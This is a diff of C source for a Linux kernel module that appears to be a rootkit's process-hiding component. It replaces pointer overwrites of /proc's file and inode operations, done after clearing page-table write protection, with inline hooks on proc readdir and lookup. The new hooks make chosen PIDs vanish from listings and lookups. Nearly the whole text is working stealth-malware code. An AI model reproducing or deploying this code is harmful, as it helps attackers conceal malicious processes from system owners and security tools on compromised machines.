@@ -12,16 +12,11 @@
 #include <linux/kallsyms.h>
 #include <linux/dirent.h>
 #include <linux/vmalloc.h>
+#include <linux/dcache.h>
 
-#if defined(__x86_64__) || defined(__i386__)
-#include <asm/paravirt.h>
-#include <asm/pgtable.h>
-#include <asm/tlbflush.h>
-#elif defined(__aarch64__) || defined(__arm__)
-#include <asm/cacheflush.h>
-#include <asm/pgtable.h>
-#endif
+#include "inline_hook/p_lkrg_main.h"
 
+// --- PID list management (unchanged) ---
 struct hidden_pid_entry {
     struct list_head list;
     pid_t pid;
@@ -29,19 +24,6 @@ struct hidden_pid_entry {
 
 static LIST_HEAD(hidden_pids);
 static DEFINE_SPINLOCK(hidden_lock);
-
-static struct file_operations *proc_fops;
-static struct inode_operations *proc_iops;
-static struct file_operations original_proc_fops;
-static struct inode_operations original_proc_iops;
-
-#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 11, 0)
-    static int (*original_iterate_shared)(struct file *, struct dir_context *);
-    static struct dentry *(*original_lookup)(struct inode *, struct dentry *, unsigned int);
-#else
-    static int (*original_readdir)(struct file *, void *, filldir_t);
-    static struct dentry *(*original_lookup)(struct inode *, struct dentry *, struct nameidata *);
-#endif
 
 bool is_pid_hidden(pid_t pid) {
     struct hidden_pid_entry *entry;
@@ -106,6 +88,28 @@ void clear_hidden_pids(void) {
     printk(KERN_INFO "[hide_proc] Cleared all hidden PIDs\n");
 }
 
+// --- Inline hook implementation ---
+
+// Forward declarations
+int proc_readdir_entry(unsigned long ret_addr, hk_regs *regs);
+int proc_readdir_ret(unsigned long ret_addr, hk_regs *regs);
+int proc_lookup_ret(unsigned long ret_addr, hk_regs *regs);
+
+// Hook state
+static char proc_readdir_hook_state = 0;
+static char proc_lookup_hook_state = 0;
+
+// Hook structures (name removed, will use target_addr)
+static struct p_hook_struct proc_readdir_hook = {
+    .entry_fn = proc_readdir_entry,
+    .ret_fn = proc_readdir_ret,
+};
+
+static struct p_hook_struct proc_lookup_hook = {
+    .entry_fn = NULL,
+    .ret_fn = proc_lookup_ret,
+};
+
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 11, 0)
 struct hooked_dir_context {
     struct dir_context original;
@@ -126,147 +130,82 @@ static int hooked_filldir(struct dir_context *ctx, const char *name, int namlen,
     return hooked_ctx->original_ctx->actor(hooked_ctx->original_ctx, name, namlen, offset, ino, d_type);
 }
 
-static int hooked_iterate_shared(struct file *file, struct dir_context *ctx) {
-    struct hooked_dir_context hooked_ctx = {
-        .original = {
-            .actor = hooked_filldir,
-            .pos = ctx->pos,
-        },
-        .original_ctx = ctx,
-    };
-    int ret;
+int proc_readdir_entry(unsigned long ret_addr, hk_regs *regs) {
+    struct dir_context *original_ctx = (struct dir_context *)p_inline_regs_get_arg2(regs);
+    struct hooked_dir_context *hooked_ctx;
 
-    if (!file || !ctx || !original_iterate_shared)
-        return -EINVAL;
-
-    ret = original_iterate_shared(file, &hooked_ctx.original);
-    ctx->pos = hooked_ctx.original.pos;
-
-    return ret;
-}
-#else
-static int check_hide_process(const char *name) {
-    char *endptr;
-    long pid;
-
-    pid = simple_strtol(name, &endptr, 10);
-    if (*endptr == '\0' && is_pid_hidden((pid_t)pid)) {
-        return 1;
+    if (!original_ctx || !original_ctx->actor) {
+        regs->regs[15] = (unsigned long)NULL;
+        return 0;
     }
+
+    hooked_ctx = kmalloc(sizeof(*hooked_ctx), GFP_ATOMIC);
+    if (!hooked_ctx) {
+        regs->regs[15] = (unsigned long)NULL;
+        return 0;
+    }
+
+    hooked_ctx->original_ctx = original_ctx;
+    hooked_ctx->original.actor = hooked_filldir;
+    hooked_ctx->original.pos = original_ctx->pos;
+
+    p_inline_regs_set_arg2(regs, (unsigned long)&hooked_ctx->original);
+
+    regs->regs[15] = (unsigned long)hooked_ctx;
+
     return 0;
 }
 
-static int hooked_filldir(void *buf, const char *name, int namlen, loff_t offset,
-                          u64 ino, unsigned int d_type) {
-    if (check_hide_process(name))
+int proc_readdir_ret(unsigned long ret_addr, hk_regs *regs) {
+    struct hooked_dir_context *hooked_ctx = (struct hooked_dir_context *)regs->regs[15];
+
+    if (hooked_ctx) {
+        hooked_ctx->original_ctx->pos = hooked_ctx->original.pos;
+        kfree(hooked_ctx);
+    }
+
+    return 0;
+}
+#else
+// Dummy functions for older kernels
+int proc_readdir_entry(unsigned long ret_addr, hk_regs *regs) { return 0; }
+int proc_readdir_ret(unsigned long ret_addr, hk_regs *regs) { return 0; }
+#endif
+
+int proc_lookup_ret(unsigned long ret_addr, hk_regs *regs) {
+    struct dentry *dentry_arg = (struct dentry *)p_inline_regs_get_arg2(regs);
+    struct dentry *result_dentry = (struct dentry *)regs->regs[0];
+    const char *name;
+    char *endptr;
+    long pid;
+
+    if (!result_dentry || IS_ERR(result_dentry)) {
         return 0;
+    }
 
-    return ((filldir_t)buf)(buf, name, namlen, offset, ino, d_type);
-}
+    if (!dentry_arg || !dentry_arg->d_name.name) {
+        return 0;
+    }
 
-static int hooked_readdir(struct file *file, void *dirent, filldir_t filldir) {
-    return original_readdir(file, (void *)filldir, hooked_filldir);
-}
-#endif
-
-#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 11, 0)
-static struct dentry *hooked_lookup(struct inode *dir, struct dentry *dentry, unsigned int flags) {
-    char *endptr;
-    long pid;
-    const char *name = dentry->d_name.name;
-
+    name = dentry_arg->d_name.name;
     pid = simple_strtol(name, &endptr, 10);
+
     if (*endptr == '\0' && is_pid_hidden((pid_t)pid)) {
-        return NULL;
+        dput(result_dentry);
+        regs->regs[0] = (unsigned long)NULL;
     }
 
-    if (original_lookup)
-        return original_lookup(dir, dentry, flags);
-
-    return NULL;
-}
-#else
-static struct dentry *hooked_lookup(struct inode *dir, struct dentry *dentry, struct nameidata *nd) {
-    char *endptr;
-    long pid;
-    const char *name = dentry->d_name.name;
-
-    pid = simple_strtol(name, &endptr, 10);
-    if (*endptr == '\0' && is_pid_hidden((pid_t)pid)) {
-        return NULL;
-    }
-
-    if (original_lookup)
-        return original_lookup(dir, dentry, nd);
-
-    return NULL;
-}
-#endif
-
-static void set_memory_rw(unsigned long addr) {
-#if defined(__x86_64__) || defined(__i386__)
-    unsigned int level;
-    pte_t *pte = lookup_address(addr, &level);
-    if (pte && pte->pte) {
-        pte->pte |= 0x2;  // Set write bit
-    }
-#elif defined(__aarch64__)
-    // ARM64: Modify page table attributes
-    // This is simplified - production code needs proper implementation
-    unsigned long start = addr & PAGE_MASK;
-    unsigned long size = PAGE_SIZE;
-
-    // Use kernel functions if available
-    #if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 0, 0)
-        // Modern kernels may have set_memory_rw
-    #else
-        // Fallback for older kernels
-    #endif
-#elif defined(__arm__)
-    // ARM32 implementation
-#else
-    // Generic fallback - no protection change
-#endif
-}
-
-static void set_memory_ro(unsigned long addr) {
-#if defined(__x86_64__) || defined(__i386__)
-    unsigned int level;
-    pte_t *pte = lookup_address(addr, &level);
-    if (pte && pte->pte) {
-        pte->pte &= ~0x2;  // Clear write bit
-    }
-#elif defined(__aarch64__)
-    // ARM64: Modify page table attributes
-    unsigned long start = addr & PAGE_MASK;
-    unsigned long size = PAGE_SIZE;
-
-    #if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 0, 0)
-        // Modern kernels may have set_memory_ro
-    #else
-        // Fallback for older kernels
-    #endif
-#elif defined(__arm__)
-    // ARM32 implementation
-#else
-    // Generic fallback - no protection change
-#endif
-}
-
-// Wrapper functions for compatibility
-static inline void set_addr_rw(unsigned long addr) {
-    set_memory_rw(addr);
-}
-
-static inline void set_addr_ro(unsigned long addr) {
-    set_memory_ro(addr);
+    return 0;
 }
 
 int hide_proc_init(void) {
-    struct file *proc_file;
     struct path proc_path;
     struct inode *proc_inode;
+    void *readdir_ptr = NULL;
+    void *lookup_ptr = NULL;
     int ret;
+
+    printk(KERN_INFO "[hide_proc] Initializing process hiding (inline hook, dynamic address)\n");
 
     ret = kern_path("/proc", LOOKUP_FOLLOW, &proc_path);
     if (ret) {
@@ -281,79 +220,45 @@ int hide_proc_init(void) {
         return -ENOENT;
     }
 
-    proc_fops = (struct file_operations *)proc_inode->i_fop;
-    proc_iops = (struct inode_operations *)proc_inode->i_op;
-
-    memcpy(&original_proc_fops, proc_fops, sizeof(struct file_operations));
-    memcpy(&original_proc_iops, proc_iops, sizeof(struct inode_operations));
-
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 11, 0)
-    original_iterate_shared = proc_fops->iterate_shared;
-    if (!original_iterate_shared) {
-        original_iterate_shared = proc_fops->iterate;
+    readdir_ptr = (void *)proc_inode->i_fop->iterate_shared;
+    if (!readdir_ptr) {
+        readdir_ptr = (void *)proc_inode->i_fop->iterate;
     }
 #else
-    original_readdir = proc_fops->readdir;
+    readdir_ptr = (void *)proc_inode->i_fop->readdir;
 #endif
-    original_lookup = proc_iops->lookup;
-
-    set_addr_rw((unsigned long)proc_fops);
-    set_addr_rw((unsigned long)proc_iops);
-
-#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 11, 0)
-    if (proc_fops->iterate_shared) {
-        proc_fops->iterate_shared = hooked_iterate_shared;
-    } else if (proc_fops->iterate) {
-        proc_fops->iterate = hooked_iterate_shared;
-    }
-#else
-    if (proc_fops->readdir) {
-        proc_fops->readdir = hooked_readdir;
-    }
-#endif
-
-    if (proc_iops->lookup) {
-        proc_iops->lookup = hooked_lookup;
-    }
-
-    set_addr_ro((unsigned long)proc_fops);
-    set_addr_ro((unsigned long)proc_iops);
+    lookup_ptr = (void *)proc_inode->i_op->lookup;
 
     path_put(&proc_path);
 
-    printk(KERN_INFO "[hide_proc] Initialized process hiding (Level 1 & 2)\n");
+    if (!readdir_ptr || !lookup_ptr) {
+        printk(KERN_ERR "[hide_proc] Failed to find readdir/lookup function pointers.\n");
+        return -ENOENT;
+    }
+
+    proc_readdir_hook.target_addr = readdir_ptr;
+    proc_lookup_hook.target_addr = lookup_ptr;
+
+    ret = p_install_hook(&proc_readdir_hook, &proc_readdir_hook_state, 0);
+    if (ret) {
+        printk(KERN_ERR "[hide_proc] Failed to hook readdir function at %p\n", readdir_ptr);
+        return ret;
+    }
+
+    ret = p_install_hook(&proc_lookup_hook, &proc_lookup_hook_state, 0);
+    if (ret) {
+        printk(KERN_ERR "[hide_proc] Failed to hook lookup function at %p\n", lookup_ptr);
+        p_uninstall_hook(&proc_readdir_hook, &proc_readdir_hook_state);
+        return ret;
+    }
+
     return 0;
 }
 
 void hide_proc_exit(void) {
-    if (!proc_fops || !proc_iops)
-        return;
-
-    set_addr_rw((unsigned long)proc_fops);
-    set_addr_rw((unsigned long)proc_iops);
-
-#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 11, 0)
-    if (original_iterate_shared) {
-        if (proc_fops->iterate_shared) {
-            proc_fops->iterate_shared = original_iterate_shared;
-        } else if (proc_fops->iterate) {
-            proc_fops->iterate = original_iterate_shared;
-        }
-    }
-#else
-    if (original_readdir) {
-        proc_fops->readdir = original_readdir;
-    }
-#endif
-
-    if (original_lookup) {
-        proc_iops->lookup = original_lookup;
-    }
-
-    set_addr_ro((unsigned long)proc_fops);
-    set_addr_ro((unsigned long)proc_iops);
-
+    printk(KERN_INFO "[hide_proc] Exiting process hiding (inline hook)\n");
+    p_uninstall_hook(&proc_readdir_hook, &proc_readdir_hook_state);
+    p_uninstall_hook(&proc_lookup_hook, &proc_lookup_hook_state);
     clear_hidden_pids();
-
-    printk(KERN_INFO "[hide_proc] Exited process hiding\n");
 }
